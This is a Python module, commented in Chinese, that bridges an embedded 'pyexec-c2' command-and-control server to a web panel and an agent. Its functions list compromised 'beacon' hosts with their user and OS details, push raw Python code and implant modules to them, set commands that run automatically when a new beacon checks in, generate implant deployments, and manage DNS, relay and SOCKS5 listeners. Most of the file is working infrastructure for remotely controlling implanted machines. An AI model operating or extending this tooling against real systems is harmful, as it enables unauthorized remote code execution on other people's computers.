"""C2 桥接 — 内嵌 pyexec-c2 server,向 FlowScan web 面板与 Agent 暴露操作接口。

参照 FlowScan/c2_server 目录下的 PyExec2 C2 server 代码(原 server/ 内容拍平副本)设计。
C2 server 以 headless 方式跑在后台线程(listener + cleanup + udp 心跳),web/agent 通过
Dispatcher.execute() 统一命令入口操作:列 beacon、看详情、下发 exec、收结果。

懒加载:首次调用 init_c2() 时才 import + 启动,失败不崩溃调用方。
"""

import importlib
import json
import os
import sys
import threading
from datetime import datetime, timezone

# C2 server 内部用 datetime.now()(服务器本地 naive 时间)记录时间戳,
# 直接 isoformat() 输出无时区信息,前端 new Date() 会按访问者浏览器本地时区解析,
# 服务器与访问页面电脑时区不同时,beacon 心跳/上线时间显示偏差(如服务器 UTC、
# 浏览器 +8 会差 8 小时)。统一转 UTC 并显式标注 Z,前端自动换算本地时间。
def _iso_utc(dt) -> str:
    """datetime → UTC ISO 字符串(YYYY-MM-DDTHH:MM:SSZ)。naive 按服务器本地时区解释后转 UTC。"""
    if dt is None:
        return ""
    try:
        if dt.tzinfo is None:
            dt = dt.astimezone(timezone.utc)
        return dt.strftime("%Y-%m-%dT%H:%M:%SZ")
    except Exception:
        return str(dt)

_C2 = None          # PyExec2Server 单例
_C2_LOCK = threading.Lock()
_C2_INIT_ERROR = ""  # 初始化失败信息
_C2_PROJECT_ROOT = ""   # 最近一次 init_c2 的参数(restart 用)
_C2_CONFIG_FILE = "config.json"
_C2_MANUAL_STOP = False  # 用户手动停止标志:停止后各接口不再自动拉起(显式 start 才恢复)


def c2_running() -> bool:
    """纯查询:C2 是否已初始化且运行中(不触发启动)。"""
    srv = _C2
    if srv is None:
        return False
    try:
        return bool(srv.running)
    except Exception:
        return False


def was_manual_stopped() -> bool:
    """用户是否手动停止过 C2(停止后各接口不自动拉起,需显式 start)。"""
    return _C2_MANUAL_STOP


def start_c2(project_root: str, config_file: str = "config.json") -> tuple:
    """显式启动 C2(清除手动停止标志后 init)。返回 (ok, message)。"""
    global _C2_MANUAL_STOP
    _C2_MANUAL_STOP = False
    srv = init_c2(project_root, config_file)
    if not srv:
        return False, _C2_INIT_ERROR or "C2 启动失败"
    return True, "C2 已启动"


def stop_c2() -> tuple:
    """显式停止 C2 server(headless 线程 stop,实例置 None)。返回 (ok, message)。"""
    global _C2, _C2_MANUAL_STOP
    with _C2_LOCK:
        old = _C2
        if old is not None:
            try:
                old.stop()
            except Exception as exc:
                return False, f"stop 失败: {exc}"
            _C2 = None
        _C2_MANUAL_STOP = True
    return True, "C2 已停止"


def init_c2(project_root: str, config_file: str = "config.json"):
    """懒加载初始化 C2 server。已初始化直接返回;失败记录错误并返回 None。

    手动停止后(_C2_MANUAL_STOP=True)不自动拉起——任何懒加载入口
    (面板 API / agent 工具)都会拿到 None,须显式 start_c2() 恢复。
    """
    global _C2, _C2_INIT_ERROR, _C2_PROJECT_ROOT, _C2_CONFIG_FILE
    if _C2 is not None:
        return _C2
    if _C2_MANUAL_STOP:
        _C2_INIT_ERROR = "C2 已手动停止,请先在面板点「启动」"
        return None
    with _C2_LOCK:
        if _C2 is not None:
            return _C2
        if _C2_MANUAL_STOP:
            _C2_INIT_ERROR = "C2 已手动停止,请先在面板点「启动」"
            return None
        _C2_PROJECT_ROOT = os.path.abspath(project_root)
        _C2_CONFIG_FILE = config_file
        project_root = _C2_PROJECT_ROOT
        if not os.path.isdir(project_root):
            _C2_INIT_ERROR = f"C2 项目根不存在: {project_root}"
            return None
        # c2_server 是拍平的 server 包(无 server/ 子目录层,server.py 内部用
        # `from server.xxx` 前缀导入)。把 project_root 目录注册为 `server` 包别名,
        # 使 server.py 内部导入与下方 from server.server import 都能解析。
        parent = os.path.dirname(project_root)
        if parent not in sys.path:
            sys.path.insert(0, parent)
        try:
            pkg_name = os.path.basename(project_root)
            sys.modules.setdefault("server", importlib.import_module(pkg_name))
            from server.server import PyExec2Server
            from server.core.config import load_config
        except Exception as exc:
            _C2_INIT_ERROR = f"C2 import 失败: {exc}"
            return None
        config_path = os.path.join(project_root, config_file)
        if not os.path.isfile(config_path):
            _C2_INIT_ERROR = f"C2 配置不存在: {config_path}"
            return None
        try:
            config = load_config(config_path)
            # 端口合并:config.yaml 的 c2.server_port / c2.client_port 优先覆盖(改外层配置免重建镜像)
            port_override = _server_port_from_flowscan_config()
            if port_override:
                config.server_port = port_override
            client_override = _client_port_from_flowscan_config()
            if client_override:
                config.client_port = client_override
            server = PyExec2Server(config, headless=True)
        except Exception as exc:
            _C2_INIT_ERROR = f"C2 server 初始化失败: {exc}"
            return None
        # 后台线程跑 start()(headless 循环阻塞在后台,listener/cleanup/udp 一并启动)
        t = threading.Thread(target=server.start, daemon=True, name="c2-server")
        t.start()
        _C2 = server
        return server


def get_c2():
    return _C2


def init_error() -> str:
    return _C2_INIT_ERROR


_FLOWSCAN_CONFIG_PATH = ""


def set_flowscan_config(config_path: str) -> None:
    """记录 FlowScan config.yaml 路径,供 agent 工具从 config 读 c2 段。"""
    global _FLOWSCAN_CONFIG_PATH
    _FLOWSCAN_CONFIG_PATH = config_path


def init_from_flowscan_config():
    """用 FlowScan config.yaml 的 c2 段懒加载 C2。未启用返回 None。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return None
    import yaml
    try:
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            cfg = yaml.safe_load(f).get("c2", {}) or {}
    except Exception:
        return None
    if not cfg.get("enabled", False):
        return None
    return init_c2(str(cfg.get("project_root", "")), str(cfg.get("config_file", "config.json")))


def _server_port_from_flowscan_config():
    """从 FlowScan config.yaml 的 c2.server_port 读 implant 监听端口(可选,优先覆盖 config.json)。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return None
    import yaml
    try:
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            v = (yaml.safe_load(f).get("c2", {}) or {}).get("server_port")
        return int(v) if v else None
    except Exception:
        return None


def _client_port_from_flowscan_config():
    """从 FlowScan config.yaml 的 c2.client_port 读 client 监听端口(可选,优先覆盖 config.json)。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return None
    import yaml
    try:
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            v = (yaml.safe_load(f).get("c2", {}) or {}).get("client_port")
        return int(v) if v else None
    except Exception:
        return None


def _beacon_dict(rec) -> dict:
    return {
        "client_id": rec.client_id,
        "sys_user": rec.sys_user or "",
        "sys_os": rec.sys_os or "",
        "sys_platform": rec.sys_platform or "",
        "tags": list(getattr(rec, "tags", []) or []),
        "via": getattr(rec, "via", "") or "直连",
        "is_fork": bool(getattr(rec, "is_fork", False)),
        "is_shell": bool(getattr(rec, "is_shell", False)),
        "is_client": bool(rec.is_client),
        "first_seen": _iso_utc(rec.first_seen),
        "last_seen": _iso_utc(rec.last_seen),
        "result_count": len(rec.results),
    }


def list_beacons() -> list:
    """列出所有 beacon(排除 client 通道连接)。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        return [_beacon_dict(r) for r in server._mgr.list_clients() if not r.is_client]


def get_beacon(client_id: str):
    """返回 beacon 详情 + 最近结果。"""
    server = get_c2()
    if not server:
        return None
    with _C2_LOCK:
        rec = server._mgr.get_client(client_id)
        if not rec:
            return None
        d = _beacon_dict(rec)
        d["results"] = [
            {
                "task_id": r.task_id,
                "output": r.output or "",
                "error": r.error or "",
                "received_at": _iso_utc(r.received_at),
            }
            for r in list(rec.results)[-20:]
        ]
        d["pending_count"] = server._tq.pending_count(client_id)
        return d


def execute(line: str) -> str:
    """执行一行 C2 命令文本(show/use/exec/result/...),返回输出。"""
    server = get_c2()
    if not server:
        return f"[!] C2 未启动: {_C2_INIT_ERROR or '未初始化'}"
    with _C2_LOCK:
        return server._dispatcher.execute(line)


def select_beacon(client_id: str):
    """把前端选中的 beacon 同步到后端 Dispatcher(等价于终端 use <bid>)。

    走命令 handler,自动校验 beacon 存在并同步 relay hub(current_beacon 生效),
    之后终端里 exec/result 等不带 <bid> 的命令直接作用于该 beacon。
    """
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    client_id = str(client_id or "").strip()
    if not client_id:
        return False, "client_id 为空"
    with _C2_LOCK:
        out = server._dispatcher.execute(f"use {client_id}")
    ok = out.startswith("[*]")
    return ok, out


def get_current_beacon() -> str:
    """当前选中 beacon ID(Dispatcher.current_beacon)。"""
    server = get_c2()
    if not server:
        return ""
    try:
        with _C2_LOCK:
            return str(getattr(server._dispatcher, "current_beacon", "") or "")
    except Exception:
        return ""  # server 对象不完整(中间态/stop 后)时审计等调用方不崩


# ── 模块管理(植入模块 modules/ + server 模块 s_modules/) ──

def list_modules() -> list:
    """列出植入模块摘要 [{name, desc, type, params/steps}]。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        return server._dispatcher.modules.list_modules()


def list_smodules() -> list:
    """列出 server 端模块摘要。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        return server._dispatcher.smods.list_modules()


def get_module(name: str):
    """获取模块完整元数据(desc/params/result_processor/code/funcs/steps)。"""
    server = get_c2()
    if not server:
        return None
    with _C2_LOCK:
        return server._dispatcher.modules.get_module(name)


def build_module_task(name: str, args: list, platform: str = ""):
    """dry-run 构建模块下发代码(不实际执行)。返回 (ok, code_or_error)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    with _C2_LOCK:
        try:
            task = server._dispatcher.build_task(name, list(args or []), platform=platform)
            if task is None:
                return False, f"模块 {name} 不存在"
            return True, task.code
        except Exception as exc:
            return False, str(exc)


def exec_module_to_beacon(client_id: str, name: str, args: list):
    """按 beacon 平台构建模块任务并下发。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    client_id = str(client_id or "").strip()
    with _C2_LOCK:
        rec = server._mgr.get_client(client_id)
        if not rec:
            return False, f"beacon 不存在: {client_id or '(空)'}"
        try:
            task = server._dispatcher.build_task_for(client_id, name, list(args or []))
            if task is None:
                return False, f"模块 {name} 不存在"
            msg = server._dispatcher.push_task(client_id, task)
            return True, msg
        except ValueError as exc:
            return False, str(exc)
        except Exception as exc:
            return False, str(exc)


def _modules_dir() -> str:
    """植入模块目录绝对路径。"""
    server = get_c2()
    cfg = server._dispatcher.config
    base = getattr(cfg, "base_dir", "") or os.path.dirname(getattr(cfg, "config_path", "") or ".")
    return os.path.join(base, getattr(cfg, "modules_dir", "modules"))


def add_module(filename: str, content: str):
    """写入模块文件到 modules/ 目录并热加载。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    filename = os.path.basename(str(filename or "").strip())
    if not (filename.endswith(".py") or filename.endswith(".json")):
        return False, "只允许 .py 或 .json 模块文件"
    if not content or not content.strip():
        return False, "模块内容为空"
    try:
        compile(content, filename, "exec") if filename.endswith(".py") else json.loads(content)
    except Exception as exc:
        return False, f"模块内容校验失败: {exc}"
    with _C2_LOCK:
        path = os.path.join(_modules_dir(), filename)
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError as exc:
            return False, f"写入失败: {exc}"
        server._dispatcher.modules.reload()
        return True, f"模块 {filename} 已写入并热加载"


def delete_module(filename: str):
    """删除模块文件并热加载。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    filename = os.path.basename(str(filename or "").strip())
    if not (filename.endswith(".py") or filename.endswith(".json")):
        return False, "只允许删除 .py 或 .json 模块文件"
    if filename == "__init__.py":
        return False, "不允许删除 __init__.py"
    with _C2_LOCK:
        path = os.path.join(_modules_dir(), filename)
        if not os.path.isfile(path):
            return False, f"模块 {filename} 不存在"
        try:
            os.remove(path)
        except OSError as exc:
            return False, f"删除失败: {exc}"
        server._dispatcher.modules.reload()
        return True, f"模块 {filename} 已删除并热生效"


def list_module_files() -> list:
    """列出模块目录下的全部模块文件（删除管理用，返回文件名）。"""
    server = get_c2()
    if not server:
        return []
    d = _modules_dir()
    if not os.path.isdir(d):
        return []
    out = []
    for fn in sorted(os.listdir(d)):
        if fn.endswith((".py", ".json")):
            out.append({"filename": fn, "name": os.path.splitext(fn)[0]})
    return out


def list_commands() -> list:
    """内置命令名列表（终端 Tab 补全用）。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        try:
            return list(server._dispatcher.command_names())
        except Exception:
            return []


def push_raw(client_id: str, code: str):
    """把原始 Python 代码作为任务下发到 beacon。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    client_id = str(client_id or "").strip()
    code = (code or "").strip()
    if not client_id:
        return False, "client_id 为空"
    if not code:
        return False, "代码为空"
    with _C2_LOCK:
        rec = server._mgr.get_client(client_id)
        if not rec:
            return False, f"beacon 不存在: {client_id}"
        from server.task_queue import Task
        task = Task(code=code)
        msg = server._dispatcher.push_task(client_id, task)
    return msg.startswith("[+]"), msg


def get_auto_commands() -> list:
    """读取 C2 首次上线自动下发命令列表。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        return list(getattr(server._config, "auto_commands", []) or [])


def set_auto_commands(commands: list):
    """更新 C2 auto_commands（内存 + 写回 config.json）。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, "C2 未启动"
    if not isinstance(commands, list):
        return False, "commands 必须是列表"
    norm = [str(c).strip() for c in commands if str(c).strip()]
    with _C2_LOCK:
        server._config.auto_commands = norm
        cfg_path = getattr(server._config, "config_path", "") or os.path.join(
            getattr(server._config, "base_dir", "") or "", "config.json")
        if cfg_path and os.path.isfile(cfg_path):
            try:
                with open(cfg_path, "r", encoding="utf-8") as f:
                    raw = json.load(f)
                raw["auto_commands"] = norm
                with open(cfg_path, "w", encoding="utf-8") as f:
                    json.dump(raw, f, indent=2, ensure_ascii=False)
            except Exception as exc:
                return False, f"写回 config.json 失败: {exc}"
        else:
            return False, f"config.json 不存在: {cfg_path}"
    return True, f"auto_commands 已更新（{len(norm)} 条），新 beacon 首次上线生效"


# ══════════ 2026-08 C2 工作台增强：状态 / 任务 / 部署 / 通道 / 重启 ══════════

def _config_path_of(server) -> str:
    """server 的 config.json 绝对路径。"""
    return (getattr(server._config, "config_path", "") or
            os.path.join(getattr(server._config, "base_dir", "") or "", "config.json"))


def status_detail() -> dict:
    """服务器状态详情:监听端口/密钥指纹/通道/队列水位。"""
    server = get_c2()
    if not server:
        return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
    with _C2_LOCK:
        cfg = server._config
        key_implant = bytes.fromhex(cfg.implant_key) if len(cfg.implant_key) == 64 else b""
        beacons = [r for r in server._mgr.list_clients() if not r.is_client]
        total_pending = 0
        for r in beacons:
            total_pending += server._tq.pending_count(r.client_id)
        return {
            "ok": True,
            "running": server.running,
            "config": {
                "server_host": cfg.server_host,
                "server_port": cfg.server_port,
                "client_port": cfg.client_port,
                "client_tls": bool(getattr(cfg, "client_tls", False)),
                "https_port": cfg.https_port or 0,
                "dns_port": cfg.dns_port or 0,
                "relay_port": cfg.relay_port or 0,
                "socks5_port": cfg.socks5_port or 0,
                "client_timeout": cfg.client_timeout,
                "exec_timeout": cfg.exec_timeout,
                "beacon_expire_seconds": cfg.beacon_expire_seconds,
                "max_tasks_per_client": cfg.max_tasks_per_client,
                "max_results_per_beacon": cfg.max_results_per_beacon,
                "auto_commands": list(getattr(cfg, "auto_commands", []) or []),
            },
            "implant_key_fp": key_implant.hex()[:8] + "…" + key_implant.hex()[-8:] if key_implant else "",
            "client_key_ready": bool(getattr(server, "_key_client", b"")),
            "listeners": {
                "beacon": {"enabled": True, "port": cfg.server_port},
                "client": {"enabled": True, "port": cfg.client_port, "ready": bool(getattr(server, "_key_client", b""))},
                "https": {"enabled": bool(cfg.https_port and cfg.https_port > 0), "port": cfg.https_port or 0},
                "dns": {"enabled": bool(cfg.dns_port and cfg.dns_port > 0), "port": cfg.dns_port or 0},
                "relay": {"enabled": bool(cfg.relay_port and cfg.relay_port > 0), "port": cfg.relay_port or 0},
                "socks5": {"enabled": bool(cfg.socks5_port and cfg.socks5_port > 0), "port": cfg.socks5_port or 0},
            },
            "counts": {
                "beacons": len(beacons),
                "total_pending": total_pending,
                "max_connections": cfg.max_connections,
            },
        }


def generate_client_key():
    """一键生成 client_key(s_exec keygen)。返回 (ok, message)。"""
    server = get_c2()
    if not server:
        return False, _C2_INIT_ERROR or "C2 未启动"
    with _C2_LOCK:
        try:
            out = server._dispatcher.execute("s_exec keygen")
            return True, out
        except Exception as exc:
            return False, str(exc)


def beacon_detail(client_id: str) -> dict:
    """beacon 详情:注册信息 + 待办任务 + 最近结果(全量字段)。"""
    server = get_c2()
    if not server:
        return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
    with _C2_LOCK:
        rec = server._mgr.get_client(client_id)
        if not rec:
            return {"ok": False, "error": "beacon not found"}
        d = _beacon_dict(rec)
        d["results"] = [
            {
                "task_id": r.task_id,
                "output": r.output or "",
                "error": r.error or "",
                "received_at": _iso_utc(r.received_at),
            }
            for r in list(rec.results)[-50:]
        ]
        d["pending_count"] = server._tq.pending_count(client_id)
        # 已在锁内,直接调无锁内部实现(避免 task_list 再次 acquire 死锁)
        d["tasks"] = _task_list_unlocked(server, client_id)
        return {"ok": True, "beacon": d}


def _task_list_unlocked(server, client_id: str, limit: int = 50) -> list:
    """task_list 的无锁内部实现(调用方须已持有 _C2_LOCK)。"""
    q = getattr(server._tq, "_queues", {}).get(client_id)
    if not q:
        return []
    items = []
    for task in list(q)[:limit]:
        items.append({
            "task_id": task.task_id,
            "created_at": _iso_utc(task.created_at),
            "is_init": bool(getattr(task, "is_init", False)),
            "result_processor": task.result_processor or "",
            "code_preview": str(task.code or "")[:120],
        })
    return items


def task_list(client_id: str, limit: int = 50) -> list:
    """beacon 的待办任务快照(零侵入读 TaskQueue._queues)。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        return _task_list_unlocked(server, client_id, limit)


def build_deploy(host: str, port: int, interval: int = 60, jitter: float = 0.2) -> dict:
    """一键部署生成:调 build server 模块,返回 {ok, deploy, key_fp, note}。"""
    server = get_c2()
    if not server:
        return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
    with _C2_LOCK:
        try:
            res = server._smods.run("build", [str(host), str(port), "", str(interval), str(jitter), ""])
        except Exception as exc:
            return {"ok": False, "error": str(exc)}
    if not isinstance(res, dict) or res.get("status") != "ok":
        msg = res.get("message") if isinstance(res, dict) else str(res)
        return {"ok": False, "error": msg or "build 失败"}
    return {
        "ok": True,
        "deploy": res.get("deploy", ""),
        "key_fp": res.get("key_fp", "") or res.get("fingerprint", ""),
        "note": res.get("note", ""),
        "file": res.get("file", ""),
    }


def export_events(client_id: str = "", limit: int = 2000) -> list:
    """从 events.jsonl 导出事件(可按 beacon 过滤)。"""
    server = get_c2()
    if not server:
        return []
    with _C2_LOCK:
        event_file = getattr(server._config, "event_file", "events.jsonl")
        if not os.path.isabs(event_file):
            event_file = os.path.join(getattr(server._config, "base_dir", "") or "", event_file)
    events = []
    try:
        with open(event_file, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    ev = json.loads(line)
                except Exception:
                    continue
                bid = ev.get("client_id") or ev.get("bid") or ""
                if client_id and bid != client_id:
                    continue
                events.append(ev)
                if len(events) >= limit:
                    break
    except OSError as exc:
        return [{"error": f"events.jsonl 读取失败: {exc}"}]
    return events


def update_listener_config(updates: dict) -> tuple:
    """更新 config.json 的监听/密钥配置(写回磁盘;server 侧生效需 restart)。"""
    server = get_c2()
    if not server:
        return False, _C2_INIT_ERROR or "C2 未启动"
    cfg_path = _config_path_of(server)
    allowed = {"server_host", "server_port", "client_port", "client_tls", "https_port",
               "dns_port", "relay_port", "socks5_port", "relay_host",
               "client_timeout", "exec_timeout", "beacon_expire_seconds",
               "interval", "jitter",
               "max_tasks_per_client", "max_results_per_beacon"}
    with _C2_LOCK:
        try:
            with open(cfg_path, "r", encoding="utf-8") as f:
                raw = json.load(f)
        except OSError as exc:
            return False, f"config.json 读取失败: {exc}"
        changed = []
        for k, v in (updates or {}).items():
            if k not in allowed:
                continue
            try:
                if isinstance(v, str) and v.strip() == "":
                    v = 0 if k.endswith("_port") else v
                if k in ("client_tls",):
                    v = bool(v)
                elif k in ("server_port", "client_port", "https_port", "dns_port",
                           "relay_port", "socks5_port", "client_timeout", "exec_timeout",
                           "max_tasks_per_client", "max_results_per_beacon"):
                    v = int(v)
                elif k in ("jitter",):
                    v = float(v)
            except (TypeError, ValueError):
                continue
            if raw.get(k) != v:
                raw[k] = v
                changed.append(k)
        if not changed:
            return True, "无变更(配置已一致)"
        with open(cfg_path, "w", encoding="utf-8") as f:
            json.dump(raw, f, indent=2, ensure_ascii=False)
        return True, f"已写入 config.json: {', '.join(changed)}（重启 C2 生效）"


def restart_c2() -> tuple:
    """重启 C2 server(headless 线程 stop → 重新 init)。返回 (ok, message)。"""
    global _C2, _C2_MANUAL_STOP
    with _C2_LOCK:
        old = _C2
        if old is not None:
            try:
                old.stop()
            except Exception as exc:
                return False, f"stop 失败: {exc}"
            _C2 = None
        _C2_MANUAL_STOP = False   # 重启=重新拉起,清除手动停止标志
    if not _C2_PROJECT_ROOT:
        return False, "未初始化过 C2,无法重启"
    srv = init_c2(_C2_PROJECT_ROOT, _C2_CONFIG_FILE)
    if not srv:
        return False, f"重启失败: {_C2_INIT_ERROR}"
    return True, "C2 已重启(beacon 将自动重连)"
